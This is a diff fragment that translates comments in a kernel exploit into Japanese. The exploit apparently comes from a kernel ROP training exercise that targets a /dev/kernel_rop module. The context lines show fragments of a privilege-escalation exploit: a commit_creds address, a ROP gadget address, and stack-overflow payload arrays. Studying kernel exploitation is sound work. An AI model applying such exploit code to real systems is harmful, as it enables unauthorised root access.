@@ -23,7 +23,7 @@ uint64_t commit_creds           = 0xffffffff81066e00;
 int main() {
     // [...]
 
-    // overflow
+    // オーバーフロー
     uint64_t payload[7];
 
     int i = 6;
@@ -183,11 +183,11 @@ uint64_t mov_rdi_rax            = 0xffffffff8126caee;   // mov rdi, rax; cmp rdi
 int main() {
     save_state();
 
-    // communicate with the module
+    // モジュールとやり取りする
     int fd = open("/dev/kernel_rop", O_RDWR);
     printf("FD: %d\n", fd);
 
-    // overflow
+    // オーバーフロー
     uint64_t payload[25];
 
     int i = 6;
